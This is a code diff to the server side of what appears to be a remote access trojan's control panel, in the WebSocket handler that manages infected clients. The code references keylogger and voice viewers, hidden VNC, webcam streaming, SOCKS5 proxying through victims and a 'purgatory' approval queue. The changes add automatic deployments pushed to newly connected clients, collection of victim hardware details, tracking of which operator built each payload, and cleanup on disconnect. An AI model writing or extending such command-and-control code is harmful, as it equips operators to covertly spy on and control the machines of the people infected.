@@ -3,7 +3,7 @@ import { v4 as uuidv4 } from "uuid";
 import geoip from "geoip-lite";
 import { logAudit, AuditAction } from "../../auditLog";
 import * as clientManager from "../../clientManager";
-import { clientExists, setOnlineState, upsertClientRow, getClientEnrollmentStatus, setClientEnrollmentStatus, lookupClientByPublicKey, getClientPublicKeyById } from "../../db";
+import { clientExists, setOnlineState, upsertClientRow, getClientEnrollmentStatus, setClientEnrollmentStatus, lookupClientByPublicKey, getClientPublicKeyById, getBuildByTag } from "../../db";
 import { logger } from "../../logger";
 import { metrics } from "../../metrics";
 import { decodeMessage, encodeMessage, type WireMessage } from "../../protocol";
@@ -17,11 +17,13 @@ import { stopAllProxiesForClient } from "../socks5-proxy-manager";
 type PendingScript = {
   timeout: ReturnType<typeof setTimeout>;
   resolve: (value: { ok?: boolean; result?: string; error?: string }) => void;
+  clientId: string;
 };
 
 type PendingCommandReply = {
   timeout: ReturnType<typeof setTimeout>;
   resolve: (value: { ok: boolean; message?: string }) => void;
+  clientId: string;
 };
 
 type WsLifecycleDeps = {
@@ -52,6 +54,7 @@ type WsLifecycleDeps = {
   handleKeyloggerViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   handleVoiceViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   dispatchAutoScriptsForConnection: (info: ClientInfo, ws: ServerWebSocket<SocketData>) => void;
+  dispatchAutoDeploysForConnection: (info: ClientInfo, ws: ServerWebSocket<SocketData>) => void;
   dispatchAutoLoadPlugins: (info: ClientInfo) => void;
   takePendingNotificationScreenshot: (clientId: string) => any;
   storeNotificationScreenshot: (
@@ -84,6 +87,7 @@ type WsLifecycleDeps = {
   sendHVNCCommand: (target: ClientInfo, commandType: string, payload: Record<string, unknown>) => void;
   notifyConsoleClosed: (clientId: string, reason: string) => void;
   clearPendingNotificationScreenshots: (clientId: string) => void;
+  clearClientPluginState: (clientId: string) => void;
   notifyRemoteDesktopStatus: (clientId: string, status: string, reason?: string) => void;
   handleBuildTagConnection: (clientId: string, buildTag: string) => void;
   notifyDashboard: () => void;
@@ -268,6 +272,11 @@ export async function handleWebSocketMessage(
         }
 
         const resolvedId = ws.data.clientId;
+        const buildTag = typeof (payload as any).buildTag === "string"
+          ? (payload as any).buildTag.trim()
+          : "";
+        const build = buildTag ? getBuildByTag(buildTag) : null;
+        const builtByUserId = build?.builtByUserId;
 
         if (enrollmentStatus === "denied") {
           logger.info(`[purgatory] denied client ${resolvedId} tried to connect`);
@@ -292,12 +301,17 @@ export async function handleWebSocketMessage(
             version: (payload as any).version || undefined,
             user: (payload as any).user || undefined,
             monitors: (payload as any).monitors || undefined,
+            cpu: (payload as any).cpu || undefined,
+            gpu: (payload as any).gpu || undefined,
+            ram: (payload as any).ram || undefined,
             country,
             lastSeen: Date.now(),
             online: 0 as any,
             publicKey,
             keyFingerprint,
             enrollmentStatus: "pending",
+            buildTag: buildTag || undefined,
+            builtByUserId,
           });
 
           logger.info(`[purgatory] client ${resolvedId} is pending approval`);
@@ -328,6 +342,10 @@ export async function handleWebSocketMessage(
           logger.info(`[purgatory] kicking existing socket for ${resolvedId} (superseded)`);
           try { existingClient.ws.close(4004, "superseded"); } catch {}
           clientManager.deleteClient(resolvedId);
+          clearEnrollmentTimeout(resolvedId);
+          deps.rdStreamingState.delete(resolvedId);
+          deps.hvncStreamingState.delete(resolvedId);
+          deps.webcamStreamingState.delete(resolvedId);
         }
 
         ws.data.wasKnown = clientExists(resolvedId);
@@ -351,6 +369,8 @@ export async function handleWebSocketMessage(
           publicKey,
           keyFingerprint,
           enrollmentStatus: "approved",
+          buildTag: buildTag || undefined,
+          builtByUserId,
           online: 1 as any,
           lastSeen: Date.now(),
         });
@@ -372,6 +392,7 @@ export async function handleWebSocketMessage(
         clientManager.addClient(infoObj.id, infoObj);
 
         deps.dispatchAutoScriptsForConnection(infoObj, ws);
+        deps.dispatchAutoDeploysForConnection(infoObj, ws);
         deps.dispatchAutoLoadPlugins(infoObj);
         deps.notifyDashboard();
         deps.notifyDashboardClientEvent("client_online", {
@@ -406,7 +427,6 @@ export async function handleWebSocketMessage(
           });
           (ws as any).data.wasKnown = true;
 
-          const buildTag = typeof (payload as any).buildTag === "string" ? (payload as any).buildTag : "";
           if (buildTag) {
             deps.handleBuildTagConnection(infoObj.id, buildTag);
           }
@@ -442,6 +462,7 @@ export async function handleWebSocketMessage(
           }
         }
         handleFrame(client, payload);
+        try { ws.send(encodeMessage({ type: "frame_ack" })); } catch {}
         break;
       case "screenshot_result":
         deps.handleNotificationScreenshotResult(client.id, payload);
@@ -546,6 +567,16 @@ export async function handleWebSocketMessage(
         const connId = (payload as any).connectionId;
         if (typeof connId === "string") {
           deps.handleProxyTunnelClose(client.id, connId);
+        }
+        break;
+      }
+      case "disconnect_info": {
+        const reason = typeof (payload as any).reason === "string" ? (payload as any).reason : "";
+        const detail = typeof (payload as any).detail === "string" ? (payload as any).detail : "";
+        if (reason) {
+          ws.data.disconnectReason = reason;
+          ws.data.disconnectDetail = detail || undefined;
+          logger.debug(`[disconnect_info] ${client.id} reason=${reason}`);
         }
         break;
       }
@@ -703,14 +734,35 @@ export function handleWebSocketClose(
     });
   }
 
+  const storedDisconnectReason = ws.data.disconnectReason;
+  const storedDisconnectDetail = ws.data.disconnectDetail;
+
   clientManager.deleteClient(clientId);
   stopAllProxiesForClient(clientId);
   clearClientSyncState(clientId);
   deps.notifyConsoleClosed(clientId, "Client disconnected");
-  setOnlineState(clientId, false);
+  setOnlineState(clientId, false, storedDisconnectReason, storedDisconnectDetail);
   deps.clearPendingNotificationScreenshots(clientId);
+  deps.clearClientPluginState(clientId);
+  for (const [cmdId, pending] of deps.pendingScripts) {
+    if (pending.clientId === clientId) {
+      clearTimeout(pending.timeout);
+      pending.resolve({ ok: false, error: "Client disconnected" });
+      deps.pendingScripts.delete(cmdId);
+    }
+  }
+  for (const [cmdId, pending] of deps.pendingCommandReplies) {
+    if (pending.clientId === clientId) {
+      clearTimeout(pending.timeout);
+      pending.resolve({ ok: false, message: "Client disconnected" });
+      deps.pendingCommandReplies.delete(cmdId);
+    }
+  }
+  deps.rdStreamingState.delete(clientId);
+  deps.hvncStreamingState.delete(clientId);
+  deps.webcamStreamingState.delete(clientId);
   deps.notifyDashboard();
-  logger.info(`[close] ${clientId} code=${code} reason=${reason}`);
+  logger.info(`[close] ${clientId} code=${code} reason=${reason} disconnect_reason=${storedDisconnectReason || "unknown"}`);
 
   if (role === "client") {
     deps.notifyRemoteDesktopStatus(clientId, "offline", "Client disconnected");
@@ -722,7 +774,7 @@ export function handleWebSocketClose(
       action: AuditAction.CLIENT_DISCONNECT,
       targetClientId: clientId,
       success: true,
-      details: JSON.stringify({ code, reason: String(reason || "") }),
+      details: JSON.stringify({ code, reason: String(reason || ""), disconnectReason: storedDisconnectReason || null }),
     });
   }
 }
